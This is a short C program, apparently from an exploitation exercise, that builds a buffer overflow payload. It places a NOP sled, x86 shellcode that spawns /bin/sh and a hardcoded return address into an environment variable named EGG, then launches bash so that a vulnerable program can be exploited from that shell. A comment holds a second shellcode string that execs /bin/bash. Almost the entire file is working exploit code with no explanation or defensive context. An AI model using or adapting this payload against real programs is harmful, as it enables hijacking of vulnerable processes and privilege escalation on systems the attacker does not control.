/**
This function exists only because using python or perl to inject the shellcode can sometimes
cause unwarranted problems. For eg "0x09" is tolerated by C, but this being the ascii for tab
is terminated by Python if found in the string breaking the shellcode
**/

// Shellcode is 49 bytes long
// Shellcode "\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"


#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#define NOP 0x90

//char retaddr[]="\xaa\xaa\xaa\xaa";//replace with return address

char retaddr[]="\xb0\xf1\xff\xbf";

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";

main()
{
   char buffer[104];
   memset(buffer,NOP,104);
   memcpy(buffer,"EGG=",4);
   memcpy(buffer+4,shellcode,28);
   memcpy(buffer+96,retaddr,4);
   memcpy(buffer+100,"\x00\x00\x00\x00",4); //last 4 bytes end with null
   putenv(buffer);
   system("/bin/bash");// call the bash shell with the environment variable set.
   //from this shell we can use the environment variable i.e EGG to exploit the original program.
   return 0;
}
